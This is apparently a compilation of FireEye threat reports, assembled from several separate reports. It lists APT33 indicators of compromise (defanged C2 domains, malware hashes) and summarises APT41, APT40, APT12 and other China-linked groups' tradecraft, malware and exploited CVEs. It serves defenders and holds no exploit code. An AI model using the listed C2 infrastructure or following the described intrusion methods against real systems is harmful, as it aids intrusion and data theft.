+DROPSHOT	Dropper that has been observed dropping and launching the TURNEDUP backdoor, as well as the SHAPESHIFT wiper malware	Non-Public
+NANOCORE	Publicly available remote access Trojan (RAT) available for purchase. It is a full-featured backdoor with a plugin framework	Public
+NETWIRE	Backdoor that attempts to steal credentials from the local machine from a variety of sources and supports other standard backdoor features.	Public
+TURNEDUP	Backdoor capable of uploading and downloading files, creating a reverse shell, taking screenshots, and gathering system information	Non-Public
+Indicators of Compromise
+APT33 Domains Likely Used in Initial Targeting
+
+ 
+
+Domain
+boeing.servehttp[.]com
+alsalam.ddns[.]net
+ngaaksa.ddns[.]net
+ngaaksa.sytes[.]net
+vinnellarabia.myftp[.]org
+APT33 Domains / IPs Used for C2
+
+ 
+
+C2 Domain	MALWARE
+managehelpdesk[.]com	NANOCORE
+microsoftupdated[.]com	NANOCORE
+osupd[.]com	NANOCORE
+mywinnetwork.ddns[.]net	NETWIRE
+www.chromup[.]com	TURNEDUP
+www.securityupdated[.]com	TURNEDUP
+googlmail[.]net	TURNEDUP
+microsoftupdated[.]net	TURNEDUP
+syn.broadcaster[.]rocks	TURNEDUP
+www.googlmail[.]net	TURNEDUP
+Publicly Available Tools used by APT33
+
+ 
+
+MD5	MALWARE	Compile Time (UTC)
+3f5329cf2a829f8840ba6a903f17a1bf	NANOCORE	2017/1/11 2:20
+10f58774cd52f71cd4438547c39b1aa7	NANOCORE	2016/3/9 23:48
+663c18cfcedd90a3c91a09478f1e91bc	NETWIRE	2016/6/29 13:44
+6f1d5c57b3b415edc3767b079999dd50	NETWIRE	2016/5/29 14:11
+Unattributed DROPSHOT / SHAPESHIFT MD5 Hashes
+
+ 
+
+MD5	MALWARE	Compile Time (UTC)
+0ccc9ec82f1d44c243329014b82d3125	
+DROPSHOT
+
+(drops SHAPESHIFT
+
+n/a - timestomped
+fb21f3cea1aa051ba2a45e75d46b98b8	DROPSHOT	n/a - timestomped
+3e8a4d654d5baa99f8913d8e2bd8a184	SHAPESHIFT	2016/11/14 21:16:40
+6b41980aa6966dda6c3f68aeeb9ae2e0	SHAPESHIFT	2016/11/14 21:16:40
+APT33 Malware MD5 Hashes
+
+ 
+
+MD5	MALWARE	Compile Time (UTC)
+8e67f4c98754a2373a49eaf53425d79a	DROPSHOT (drops TURNEDUP)	2016/10/19 14:26
+c57c5529d91cffef3ec8dadf61c5ffb2	TURNEDUP	2014/6/1 11:01
+c02689449a4ce73ec79a52595ab590f6	TURNEDUP	2016/9/18 10:50
+59d0d27360c9534d55596891049eb3ef	TURNEDUP	2016/3/8 12:34
+59d0d27360c9534d55596891049eb3ef	TURNEDUP	2016/3/8 12:34
+797bc06d3e0f5891591b68885d99b4e1	TURNEDUP	2015/3/12 5:59
+8e6d5ef3f6912a7c49f8eb6a71e18ee2	TURNEDUP	2015/3/12 5:59
+32a9a9aa9a81be6186937b99e04ad4be	TURNEDUP	2015/3/12 5:59
+a272326cb5f0b73eb9a42c9e629a0fd8	TURNEDUP	2015/3/9 16:56
+a813dd6b81db331f10efaf1173f1da5d	TURNEDUP	2015/3/9 16:56
+de9e3b4124292b4fba0c5284155fa317	TURNEDUP	2015/3/9 16:56
+a272326cb5f0b73eb9a42c9e629a0fd8	TURNEDUP	2015/3/9 16:56
+b3d73364995815d78f6d66101e718837	TURNEDUP	2014/6/1 11:01
+de7a44518d67b13cda535474ffedf36b	TURNEDUP	2014/6/1 11:01
+b5f69841bf4e0e96a99aa811b52d0e90	TURNEDUP	2014/6/1 11:01
+a2af2e6bbb6551ddf09f0a7204b5952e	TURNEDUP	2014/6/1 11:01
+b189b21aafd206625e6c4e4a42c8ba76	TURNEDUP	2014/6/1 11:01
+aa63b16b6bf326dd3b4e82ffad4c1338	TURNEDUP	2014/6/1 11:01
+c55b002ae9db4dbb2992f7ef0fbc86cb	TURNEDUP	2014/6/1 11:01
+c2d472bdb8b98ed83cc8ded68a79c425	TURNEDUP	2014/6/1 11:01
+c6f2f502ad268248d6c0087a2538cad0	TURNEDUP	2014/6/1 11:01
+c66422d3a9ebe5f323d29a7be76bc57a	TURNEDUP	2014/6/1 11:01
+ae47d53fe8ced620e9969cea58e87d9a	TURNEDUP	2014/6/1 11:01
+b12faab84e2140dfa5852411c91a3474	TURNEDUP	2014/6/1 11:01
+c2fbb3ac76b0839e0a744ad8bdddba0e	TURNEDUP	2014/6/1 11:01
+a80c7ce33769ada7b4d56733d02afbe5	TURNEDUP	2014/6/1 11:01
+6a0f07e322d3b7bc88e2468f9e4b861b	TURNEDUP	2014/6/1 11:01
+b681aa600be5e3ca550d4ff4c884dc3d	TURNEDUP	2014/6/1 11:01
+ae870c46f3b8f44e576ffa1528c3ea37	TURNEDUP	2014/6/1 11:01
+bbdd6bb2e8827e64cd1a440e05c0d537	TURNEDUP	2014/6/1 11:01
+0753857710dcf96b950e07df9cdf7911	TURNEDUP	2013/4/10 10:43
+d01781f1246fd1b64e09170bd6600fe1	TURNEDUP	2013/4/10 10:43
+1381148d543c0de493b13ba8ca17c14f	TURNEDUP	2013/4/10 10:43
+Today, FireEye Intelligence is releasing a comprehensive report detailing APT41, a prolific Chinese cyber threat group that carries out state-sponsored espionage activity in parallel with financially motivated operations. APT41 is unique among tracked China-based actors in that it leverages non-public malware typically reserved for espionage campaigns in what appears to be activity for personal gain. Explicit financially-motivated targeting is unusual among Chinese state-sponsored threat groups, and evidence suggests APT41 has conducted simultaneous cyber crime and cyber espionage operations from 2014 onward.
+
+The full published report covers historical and ongoing activity attributed to APT41, the evolution of the group’s tactics, techniques, and procedures (TTPs), information on the individual actors, an overview of their malware toolset, and how these identifiers overlap with other known Chinese espionage operators. APT41 partially coincides with public reporting on groups including BARIUM (Microsoft) and Winnti (Kaspersky, ESET, Clearsky).
+
+Who Does APT41 Target?
+Like other Chinese espionage operators, APT41 espionage targeting has generally aligned with China's Five-Year economic development plans. The group has established and maintained strategic access to organizations in the healthcare, high-tech, and telecommunications sectors. APT41 operations against higher education, travel services, and news/media firms provide some indication that the group also tracks individuals and conducts surveillance. For example, the group has repeatedly targeted call record information at telecom companies. In another instance, APT41 targeted a hotel’s reservation systems ahead of Chinese officials staying there, suggesting the group was tasked to reconnoiter the facility for security reasons.
+
+The group’s financially motivated activity has primarily focused on the video game industry, where APT41 has manipulated virtual currencies and even attempted to deploy ransomware. The group is adept at moving laterally within targeted networks, including pivoting between Windows and Linux systems, until it can access game production environments. From there, the group steals source code as well as digital certificates which are then used to sign malware. More importantly, APT41 is known to use its access to production environments to inject malicious code into legitimate files which are later distributed to victim organizations. These supply chain compromise tactics have also been characteristic of APT41’s best known and most recent espionage campaigns.
+
+Interestingly, despite the significant effort required to execute supply chain compromises and the large number of affected organizations, APT41 limits the deployment of follow-on malware to specific victim systems by matching against individual system identifiers. These multi-stage operations restrict malware delivery only to intended victims and significantly obfuscate the intended targets. In contrast, a typical spear-phishing campaign’s desired targeting can be discerned based on recipients' email addresses.
+
+A breakdown of industries directly targeted by APT41 over time can be found in Figure 1.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-cybercrime-espionage1_tfvl.max-1000x1000.png
+Figure 1: Timeline of industries directly targeted by APT41
+
+Probable Chinese Espionage Contractors
+Two identified personas using the monikers “Zhang Xuguang” and “Wolfzhi” linked to APT41 operations have also been identified in Chinese-language forums. These individuals advertised their skills and services and indicated that they could be hired. Zhang listed his online hours as 4:00pm to 6:00am, similar to APT41 operational times against online gaming targets and suggesting that he is moonlighting. Mapping the group’s activities since 2012 (Figure 2) also provides some indication that APT41 primarily conducts financially motivated operations outside of their normal day jobs.
+
+Attribution to these individuals is backed by identified persona information, their previous work and apparent expertise in programming skills, and their targeting of Chinese market-specific online games. The latter is especially notable because APT41 has repeatedly returned to targeting the video game industry and we believe these activities were formative in the group’s later espionage operations.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-cybercrime-espionage2_xefi.max-800x800.png
+Figure 2: Operational activity for gaming versus non-gaming-related targeting based on observed operations since 2012
+
+The Right Tool for the Job
+APT41 leverages an arsenal of over 46 different malware families and tools to accomplish their missions, including publicly available utilities, malware shared with other Chinese espionage operations, and tools unique to the group. The group often relies on spear-phishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims. Once in a victim organization, APT41 can leverage more sophisticated TTPs and deploy additional malware. For example, in a campaign running almost a year, APT41 compromised hundreds of systems and used close to 150 unique pieces of malware including backdoors, credential stealers, keyloggers, and rootkits.
+
+APT41 has also deployed rootkits and Master Boot Record (MBR) bootkits on a limited basis to hide their malware and maintain persistence on select victim systems. The use of bootkits in particular adds an extra layer of stealth because the code is executed prior to the operating system initializing. The limited use of these tools by APT41 suggests the group reserves more advanced TTPs and malware only for high-value targets.
+
+Fast and Relentless
+APT41 quickly identifies and compromises intermediary systems that provide access to otherwise segmented parts of an organization’s network. In one case, the group compromised hundreds of systems across multiple network segments and several geographic regions in as little as two weeks.
+
+The group is also highly agile and persistent, responding quickly to changes in victim environments and incident responder activity. Hours after a victimized organization made changes to thwart APT41, for example, the group compiled a new version of a backdoor using a freshly registered command-and-control domain and compromised several systems across multiple geographic regions. In a different instance, APT41 sent spear-phishing emails to multiple HR employees three days after an intrusion had been remediated and systems were brought back online. Within hours of a user opening a malicious attachment sent by APT41, the group had regained a foothold within the organization's servers across multiple geographic regions.
+
+Looking Ahead
+APT41 is a creative, skilled, and well-resourced adversary, as highlighted by the operation’s distinct use of supply chain compromises to target select individuals, consistent signing of malware using compromised digital certificates, and deployment of bootkits (which is rare among Chinese APT groups).
+
+Like other Chinese espionage operators, APT41 appears to have moved toward strategic intelligence collection and establishing access and away from direct intellectual property theft since 2015. This shift, however, has not affected the group's consistent interest in targeting the video game industry for financially motivated reasons. The group's capabilities and targeting have both broadened over time, signaling the potential for additional supply chain compromises affecting a variety of victims in additional verticals.
+
+APT41's links to both underground marketplaces and state-sponsored activity may indicate the group enjoys protections that enables it to conduct its own for-profit activities, or authorities are willing to overlook them. It is also possible that APT41 has simply evaded scrutiny from Chinese authorities. Regardless, these operations underscore a blurred line between state power and crime that lies at the heart of threat ecosystems and is exemplified by APT41.
+FireEye is highlighting a cyber espionage operation targeting crucial technologies and traditional intelligence targets from a China-nexus state sponsored actor we call APT40. The actor has conducted operations since at least 2013 in support of China’s naval modernization effort. The group has specifically targeted engineering, transportation, and the defense industry, especially where these sectors overlap with maritime technologies. More recently, we have also observed specific targeting of countries strategically important to the Belt and Road Initiative including Cambodia, Belgium, Germany, Hong Kong, Philippines, Malaysia, Norway, Saudi Arabia, Switzerland, the United States, and the United Kingdom. This China-nexus cyber espionage group was previously reported as TEMP.Periscope and TEMP.Jumper.
+
+Mission
+In December 2016, China’s People Liberation Army Navy (PLAN) seized a U.S. Navy unmanned underwater vehicle (UUV) operating in the South China Sea. The incident paralleled China’s actions in cyberspace; within a year APT40 was observed masquerading as a UUV manufacturer, and targeting universities engaged in naval research. That incident was one of many carried out to acquire advanced technology to support the development of Chinese naval capabilities. We believe APT40’s emphasis on maritime issues and naval technology ultimately support China’s ambition to establish a blue-water navy.
+
+In addition to its maritime focus, APT40 engages in broader regional targeting against traditional intelligence targets, especially organizations with operations in Southeast Asia or involved in South China Sea disputes. Most recently, this has included victims with connections to elections in Southeast Asia, which is likely driven by events affecting China’s Belt and Road Initiative. China’s “One Belt, One Road” (一带一路) or “Belt and Road Initiative” (BRI) is a $1 trillion USD endeavor to build land and maritime trade routes across Asia, Europe, the Middle East, and Africa to develop a trade network that will project China’s influence across the greater region.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt40-china1_yqpw.max-2200x2200.png
+Figure 1: Countries and industries targeted. Countries include the United States, United Kingdom, Norway, Germany, Saudi Arabia, Cambodia and Indonesia
+
+Attribution
+We assess with moderate confidence that APT40 is a state-sponsored Chinese cyber espionage operation. The actor’s targeting is consistent with Chinese state interests and there are multiple technical artifacts indicating the actor is based in China. Analysis of the operational times of the group’s activities indicates that it is probably centered around China Standard Time (UTC +8). In addition, multiple APT40 command and control (C2) domains were initially registered by China based domain resellers and had Whois records with Chinese location information, suggesting a China based infrastructure procurement process.
+
+APT40 has also used multiple Internet Protocol (IP) addresses located in China to conduct its operations. In one instance, a log file recovered from an open indexed server revealed that an IP address (112.66.188.28) located in Hainan, China had been used to administer the command and control node that was communicating with malware on victim machines. All of the logins to this C2 were from computers configured with Chinese language settings.
+
+Attack Lifecycle
+Initial Compromise
+
+APT40 has been observed leveraging a variety of techniques for initial compromise, including web server exploitation, phishing campaigns delivering publicly available and custom backdoors, and strategic web compromises.
+
+APT40 relies heavily on web shells for an initial foothold into an organization. Depending on placement, a web shell can provide continued access to victims' environments, re-infect victim systems, and facilitate lateral movement.
+The operation’s spear-phishing emails typically leverage malicious attachments, although Google Drive links have also been observed.
+APT40 leverages exploits in their phishing operations, often weaponizing vulnerabilities within days of their disclosure. Observed vulnerabilities include:
+CVE-2012-0158
+CVE-2017-0199
+CVE-2017-8759
+CVE-2017-11882
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt40-china2_lgqf.max-800x800.png
+Figure 2: APT40 attack lifecycle
+
+Establish Foothold
+
+APT40 uses a variety of malware and tools to establish a foothold, many of which are either publicly available or used by other threat groups. In some cases, the group has used executables with code signing certificates to avoid detection.
+
+First-stage backdoors such as AIRBREAK, FRESHAIR, and BEACON are used before downloading other payloads.
+PHOTO, BADFLICK, and CHINA CHOPPER are among the most frequently observed backdoors used by APT40.
+APT40 will often target VPN and remote desktop credentials to establish a foothold in a targeted environment. This methodology proves to be ideal as once these credentials are obtained, they may not need to rely as heavily on malware to continue the mission.
+Escalate Privileges
+
+APT40 uses a mix of custom and publicly available credential harvesting tools to escalate privileges and dump password hashes.
+
+APT40 leverages custom credential theft utilities such as HOMEFRY, a password dumper/cracker used alongside the AIRBREAK and BADFLICK backdoors.
+Additionally, the Windows Sysinternals ProcDump utility and Windows Credential Editor (WCE) are believed to be used during intrusions as well.
+Internal Reconnaissance
+
+APT40 uses compromised credentials to log on to other connected systems and conduct reconnaissance. The group also leverages RDP, SSH, legitimate software within the victim environment, an array of native Windows capabilities, publicly available tools, as well as custom scripts to facilitate internal reconnaissance.
+
+APT40 used MURKYSHELL at a compromised victim organization to port scan IP addresses and conduct network enumeration.
+APT40 frequently uses native Windows commands, such as net.exe, to conduct internal reconnaissance of a victim’s environment.
+Web shells are heavily relied on for nearly all stages of the attack lifecycle. Internal web servers are often not configured with the same security controls as public-facing counterparts, making them more vulnerable to exploitation by APT40 and similarly sophisticated groups.
+Lateral Movement
+
+APT40 uses many methods for lateral movement throughout an environment, including custom scripts, web shells, a variety of tunnelers, as well as Remote Desktop Protocol (RDP). For each new system compromised, the group usually executes malware, performs additional reconnaissance, and steals data.
+
+APT40 also uses native Windows utilities such as at.exe (a task scheduler) and net.exe (a network resources management tool) for lateral movement.
+Publicly available tunneling tools are leveraged alongside distinct malware unique to the operation.
+Although MURKYTOP is primarily a command-line reconnaissance tool, it can also be used for lateral movement.
+APT40 also uses publicly available brute-forcing tools and a custom utility called DISHCLOTH to attack different protocols and services.
+Maintain Presence
+
+APT40 primarily uses backdoors, including web shells, to maintain presence within a victim environment. These tools enable continued control of key systems in the targeted network.
+
+APT40 strongly favors web shells for maintaining presence, especially publicly available tools.
+Tools used during the Establish Foothold phase also continue to be used in the Maintain Presence phase; this includes AIRBREAK and PHOTO.
+Some APT40 malware tools can evade typical network detectiona by leveraging legitimate websites, such as GitHub, Google, and Pastebin for initial C2 communications.
+Common TCP ports 80 and 443 are used to blend in with routine network traffic.
+Complete Mission
+
+Completing missions typically involves gathering and transferring information out of the target network, which may involve moving files through multiple systems before reaching the destination. APT40 has been observed consolidating files acquired from victim networks and using the archival tool rar.exe to compress and encrypt the data before exfiltration. We have also observed APT40 develop tools such as PAPERPUSH to aid in the effectiveness of their data targeting and theft.
+
+Outlook and Implications
+Despite increased public attention, APT40 continues to conduct cyber espionage operations following a regular tempo, and we anticipate their operations will continue through at least the near and medium term. Based on APT40’s broadening into election-related targets in 2017, we assess with moderate confidence that the group’s future targeting will affect additional sectors beyond maritime, driven by events such as China’s Belt and Road Initiative. In particular, as individual Belt and Road projects unfold, we are likely to see continued activity by APT40 which extends against the project’s regional opponents.
+Suspected attribution: China
+
+Target sectors: Multiple, including government, international financial organization, and aerospace and defense organizations, as well as high tech, construction and engineering, telecommunications, media, and insurance.
+
+Overview: APT31 is a China-nexus cyber espionage actor focused on obtaining information that can provide the Chinese government and state-owned enterprises with political, economic, and military advantages.
+
+Associated malware: SOGU, LUCKYBIRD, SLOWGYRO, DUCKFAT
+
+Attack vectors: APT31 has exploited vulnerabilities in applications such as Java and Adobe Flash to compromise victim environments.
+APT30
+
+Suspected attribution: China
+
+Target sectors: Members of the Association of Southeast Asian Nations (ASEAN)
+
+Overview: APT30 is noted not only for sustained activity over a long period of time but also for successfully modifying and adapting source code to maintain the same tools, tactics and infrastructure since at least 2005. Evidence shows that the group prioritizes targets, most likely works in shifts in a collaborative environment and builds malware from a coherent development plan. The group has had the capability to infect air-gapped networks since 2005.
+
+Associated malware: SHIPSHAPE, SPACESHIP, FLASHFLOOD
+
+Attack vectors: APT30 uses a suite of tools that includes downloaders, backdoors, a central controller and several components designed to infect removable drives and cross air-gapped networks to steal data. APT30 frequently registers its own DNS domains for malware CnC activities.
+
+APT27
+
+Suspected attribution: China
+
+Target sectors: APT27 has targeted multiple organizations headquartered around the globe, including North and South America, Europe, and the Middle East. These organizations fall into a range of different industries, including business services, high tech, government, and energy; however a notable number are in the aerospace and transport or travel industries.
+
+Overview: APT27 engages in cyber operations where the goal is intellectual property theft, usually focusing on the data and projects that make a particular organization competitive within its field.
+
+Associated malware: PANDORA, SOGU, ZXSHELL, GHOST, WIDEBERTH, QUICKPULSE, FLOWERPOT
+
+Attack vectors: APT27 often uses spear phishing as its initial compromise method. APT27 threat actors are not known for using original zero-day exploits, but they may leverage those exploits once they have been made public. In at least one case, APT27 actors used a compromised account at one victim organization to send a spear phishing email to other intended victims in the similar industries. Additionally, APT27 may compromise vulnerable web applications in order to gain an initial foothold.
+
+APT26
+
+Suspected attribution: China
+
+Target sectors: Aerospace, Defense, and Energy sectors, among others.
+
+Overview: APT26 engages in cyber operations where the goal is intellectual property theft, usually focusing on the data and projects that make a particular organization competitive within its field.
+
+Associated malware: SOGU, HTRAN, POSTSIZE, TWOCHAINS, BEACON
+
+Attack vectors: The group frequently uses strategic web compromises to gain access to target networks and custom backdoors once they are inside a victim environment.
+
+APT25
+
+AKA: Uncool, Vixen Panda, Ke3chang, Sushi Roll, Tor
+
+Suspected attribution: China
+
+Target sectors: The defense industrial base, media, financial services, and transportation sectors in the U.S. and Europe.
+
+Overview: APT25 engages in cyber operations where the goal is data theft.
+
+Associated malware: LINGBO, PLAYWORK, MADWOFL, MIRAGE, TOUGHROW, TOYSNAKE, SABERTOOTH
+
+Attack vectors: APT25 has historically used spear phishing in their operations, including messages containing malicious attachments and malicious hyperlinks. APT25 threat actors typically do not use zero-day exploits but may leverage those exploits once they have been made public.
+
+APT24
+
+AKA: PittyTiger
+
+Suspected attribution: China
+
+Target sectors: APT24 has targeted a wide variety of industries, including organizations in the government, healthcare, construction and engineering, mining, nonprofit, and telecommunications industries.
+
+Overview: This group is known to have targeted organizations headquartered in countries including the U.S. and Taiwan. APT24 has historically used the RAR archive utility to encrypt and compress stolen data prior to transferring it out of the network. Data theft exfiltrated from this actor mainly focused on documents with political significance, suggesting its intent is to monitor the positions of various nation states on issues applicable to China’s ongoing territorial or sovereignty dispute.
+
+Associated malware: PITTYTIGER, ENFAL, TAIDOOR
+
+Attack vectors: APT24 has used phishing emails that use military, renewable energy, or business strategy themes as lures. Further, APT24 engages in cyber operations where the goal is intellectual property theft, usually focusing on the data and projects that make a particular organization competitive within its field.
+
+APT23
+
+Suspected attribution: China
+
+Target sectors: Media and government in the U.S. and the Philippines
+
+Overview: APT23 has stolen information that has political and military significance, rather than intellectual property. This suggests that APT23 may perform data theft in support of more traditional espionage operations.
+
+Associated malware: NONGMIN
+
+Attack vectors: APT23 has used spear phishing messages to compromise victim networks, including education-related phishing lures. APT23 actors are not known to use zero-day exploits, but this group has leveraged those exploits once they have been made public.
+
+APT22
+
+AKA: Barista
+
+Suspected attribution: China
+
+Target sectors: A broad set of political, military, and economic entities in East Asia, Europe, and the U.S.
+
+Overview: We believe APT22 has a nexus to China and has been operational since at least early 2014, carrying out intrusions and attack activity against public and private sector entities, including dissidents.
+
+Associated malware: PISCES, SOGU, FLATNOTE, ANGRYBELL, BASELESS, SEAWOLF, LOGJAM
+
+Attack vectors: APT22 threat actors have used strategic web compromises in order to passively exploit targets of interest. APT22 actors have also identified vulnerable public-facing web servers on victim networks and uploaded webshells to gain access to the victim network.
+
+APT21
+
+AKA: Zhenbao
+
+Suspected attribution: China
+
+Target sectors: Government
+
+Overview: APT21 leverages strategic Russian-language attachments themed with national security issues in lure documents. Historically, social engineering content is indicative of a cyber espionage operation attempting to gain unauthorized access to privileged information concerning state security in Russia. An analysis of APT21 techniques suggests that another of their focus areas is dissident groups which seek greater autonomy or independence from China, such as those from Tibet or Xinjiang.
+
+Associated malware: SOGU, TEMPFUN, Gh0st, TRAVELNET, HOMEUNIX, ZEROTWO
+
+Attack vectors: APT21 leverages spear phishing email messages with malicious attachment, links to malicious files, or web pages. They have also used strategic web compromises (SWCs) to target potential victims. APT21 frequently uses two backdoors known as TRAVELNET and TEMPFUN. Significantly, APT21 typically primarily uses custom backdoors, rarely using publicly available tools.
+
+APT20
+
+AKA: Twivy
+
+Suspected attribution: China
+
+Target sectors: Construction and engineering, health care, non-profit organizations, defense industrial bas eand chemical research and production companies.
+
+Overview: APT20 engages in cyber operations where the goal is data theft. APT20 conducts intellectual property theft but also appears interested in stealing data from or monitoring the activities of individuals with particular political interests. Based on available data, we assess that this is a freelancer group with some nation state sponsorship located in China.
+
+Associated malware: QIAC, SOGU, Gh0st, ZXSHELL, Poison Ivy, BEACON, HOMEUNIX, STEW
+
+Attack vectors: APT20's use of strategic web compromises provides insight into a second set of likely targets. Many of APT20's SWCs have been hosted on web sites (including Chinese-language websites) that deal with issues such as democracy, human rights, freedom of the press, ethnic minorities in China, and other issues.
+
+APT19
+
+Also known as: Codoso Team
+
+Suspected attribution: China
+
+Target sectors: Legal and investment
+
+Overview: A group likely composed of freelancers, with some degree of sponsorship by the Chinese government.
+
+Associated malware: BEACON, COBALTSTRIKE
+
+Attack vectors: In 2017, APT19 used three different techniques to attempt to compromise targets. In early May, the phishing lures leveraged RTF attachments that exploited the Microsoft Windows vulnerability described in CVE 2017-0199. Toward the end of May, APT19 switched to using macro-enabled Microsoft Excel (XLSM) documents. In the most recent versions, APT19 added an application whitelisting bypass to the XLSM documents. At least one observed phishing lure delivered a Cobalt Strike payload.
+
+APT18
+
+Also known as: Wekby
+
+Suspected attribution: China
+
+Target sectors: Aerospace and Defense, Construction and Engineering, Education, Health and Biotechnology, High Tech, Telecommunications, Transportation
+
+Overview: Very little has been released publicly about this group.
+
+Associated malware: Gh0st RAT
+
+Attack vectors: Frequently developed or adapted zero-day exploits for operations, which were likely planned in advance. Used data from Hacking Team leak, which demonstrated how the group can shift resources (i.e. selecting targets, preparing infrastructure, crafting messages, updating tools) to take advantage of unexpected opportunities like newly exposed exploits.
+
+Additional Resources: Blog – Demonstrating Hustle, Chinese APT Groups Quickly Use Zero-Day Vulnerability (CVE-2015-5119) Following Hacking Team Leak
+
+APT17
+
+Also known as: Tailgator Team, Deputy Dog
+
+Suspected attribution: China
+
+Target sectors: U.S. government, and international law firms and information technology companies
+
+Overview: Conducts network intrusion against targeted organizations.
+
+Associated malware: BLACKCOFFEE
+
+Attack vectors: The threat group took advantage of the ability to create profiles and post in forums to embed encoded CnC for use with a variant of the malware it used. This technique can make it difficult for network security professionals to determine the true location of the CnC, and allow the CnC infrastructure to remain active for a longer period.
+
+APT16
+
+Suspected attribution: China
+
+Target sectors: Japanese and Taiwanese organizations in the high-tech, government services, media and financial services industries
+
+Overview: China-based group concerned with Taiwan political and journalistic matters.
+
+Associated malware: IRONHALO, ELMER
+
+Attack vectors: Spearphishing emails sent to Taiwanese media organizations and webmail addresses. Lure documents contained instructions for registration and subsequent listing of goods on a Taiwanese auction website.
+
+APT15
+
+Suspected attribution: China
+
+Target sectors: Global targets in the trade, economic and financial, energy, and military sectors in support of Chinese government interests.
+
+Overview: APT15 has targeted organizations headquartered in multiple locations, including a number of European countries, the U.S., and South Africa. APT15 operators share resources, including backdoors as well as infrastructure, with other Chinese APTs.
+
+Associated malware: ENFAL, BALDEAGLE, NOISEMAKER, MIRAGE
+
+Attack vectors: APT15 typically uses well-developed spearphishing emails for Initial Compromise against global targets in various sectors that are of interest to the Chinese government. Significantly, APT15 use backdoors and infrastructure that is not unique to the group, making attribution challenging.
+
+APT14
+
+Suspected attribution: China
+
+Target sectors: Government, telecommunications, and construction and engineering.
+
+Overview: APT14 engages in cyber operations where the goal is data theft, with a possible focus on military and maritime equipment, operations, and policies. We believe that the stolen data, especially encryption and satellite communication equipment specifications, could be used to enhance military operations, such as intercepting signals or otherwise interfering with military satellite communication networks.
+
+Associated malware: Gh0st, POISONIVY, CLUBSEAT, GROOVY
+
+Attack vectors: APT14 threat actors do not tend to use zero-day exploits but may leverage those exploits once they have been made public. They may leverage a custom SMTP mailer tool to send their spear phishing messages. APT14 phishing messages are often crafted to appear to originate from trusted organizations.
+
+
+Introduction
+
+The attackers referred to as APT12 (also known as IXESHE, DynCalc, and DNSCALC) recently started a new campaign targeting organizations in Japan and Taiwan. APT12 is believed to be a cyber espionage group thought to have links to the Chinese People's Liberation Army. APT12's targets are consistent with larger People's Republic of China (PRC) goals. Intrusions and campaigns conducted by this group are in-line with PRC goals and self-interest in Taiwan. Additionally, the new campaigns we uncovered further highlight the correlation between APT groups ceasing and retooling operations after media exposure, as APT12 used the same strategy after compromising the New York Times in Oct 2012. Much like Darwin’s theory of biological evolution, APT12 been forced to evolve and adapt in order to maintain its mission.
+
+The new campaign marks the first APT12 activity publicly reported since Arbor Networks released their blog “Illuminating The Etumbot APT Backdoor.” FireEye refers to the Etumbot backdoor as RIPTIDE. Since the release of the Arbor blog post, FireEye has observed APT12 use a modified RIPTIDE backdoor that we call HIGHTIDE. This is the second time FireEye has discovered APT12 retooling after a public disclosure. As such, FireEye believes this to be a common theme for this APT group, as APT12 will continue to evolve in an effort to avoid detection and continue its cyber operations.
+
+FireEye researchers also discovered two possibly related campaigns utilizing two other backdoors known as THREEBYTE and WATERSPOUT. Both backdoors were dropped from malicious documents built utilizing the “Tran Duy Linh” exploit kit, which exploited CVE-2012-0158. These documents were also emailed to organizations in Japan and Taiwan. While APT12 has previously used THREEBYTE, it is unclear if APT12 was responsible for the recently discovered campaign utilizing THREEBYTE. Similarly, WATERSPOUT is a newly discovered backdoor and the threat actors behind the campaign have not been positively identified. However, the WATERSPOUT campaign shared several traits with the RIPTIDE and HIGHTIDE campaign that we have attributed to APT12.
+
+Background
+
+From October 2012 to May 2014, FireEye observed APT12 utilizing RIPTIDE, a proxy-aware backdoor that communicates via HTTP to a hard-coded command and control (C2) server. RIPTIDE’s first communication with its C2 server fetches an encryption key, and the RC4 encryption key is used to encrypt all further communication.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/riptide-wireshark1_0_sdkn.max-500x500.png
+Figure 1: RIPTIDE HTTP GET Request Example
+
+In June 2014, Arbor Networks published an article describing the RIPTIDE backdoor and its C2 infrastructure in great depth. The blog highlighted that the backdoor was utilized in campaigns from March 2011 till May 2014.
+
+Following the release of the article, FireEye observed a distinct change in RIPTIDE’s protocols and strings. We suspect this change was a direct result of the Arbor blog post in order to decrease detection of RIPTIDE by security vendors. The changes to RIPTIDE were significant enough to circumvent existing RIPTIDE detection rules. FireEye dubbed this new malware family HIGHTIDE.
+
+HIGHTIDE Malware Family
+
+On Sunday August 24, 2014 we observed a spear phish email sent to a Taiwanese government ministry. Attached to this email was a malicious Microsoft Word document (MD5: f6fafb7c30b1114befc93f39d0698560) that exploited CVE-2012-0158. It is worth noting that this email appeared to have been sent from another Taiwanese Government employee, implying that the email was sent from a valid but compromised account.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/riptide-spear_bkjz.max-500x500.jpg
+Figure 2: APT12 Spearphishing Email
+
+The exploit document dropped the HIGHTIDE backdoor with the following properties:
+
+
+MD5	6e59861931fa2796ee107dc27bfdd480
+Size	75264 bytes
+Complie Time	2014-08-23 08:22:49
+Import Hash	ead55ef2b18a80c00786c25211981570
+The HIGHTIDE backdoor connected directly to 141.108.2.157. If you compare the HTTP GET request from the RIPTIDE samples (Figure 1) to the HTTP GET request from the HIGHTIDE samples (Figure 3) you can see the malware author changed the following items:
+
+User Agent
+Format and structure of the HTTP Uniform Resource Identifier (URI)
+https://storage.googleapis.com/gweb-cloudblog-publish/images/riptide2-wireshark_kkec.max-500x500.jpg
+Figure 3: HIGHTIDE GET Request Example
+
+Similar to RIPTIDE campaigns, APT12 infects target systems with HIGHTIDE using a Microsoft Word (.doc) document that exploits CVE-2012-0158. FireEye observed APT12 deliver these exploit documents via phishing emails in multiple cases. Based on past APT12 activity, we expect the threat group to continue to utilize phishing as a malware delivery method.
+
+
+MD5	File Name	Exploit
+73f493f6a2b0da23a79b50765c164e88	議程最新修正及注意事項.doc	CVE-2012-0158
+f6fafb7c30b1114befc93f39d0698560	0824.1.doc	CVE-2012-0158
+eaa6e03d9dae356481215e3a9d2914dc	簡易名冊0全國各警察機關主官至分局長.doc	CVE-2012-0158
+06da4eb2ab6412c0dc7f295920eb61c4	附檔.doc	CVE-2012-0158
+53baedf3765e27fb465057c48387c9b6	103年第3屆通訊錄.doc	CVE-2012-0158
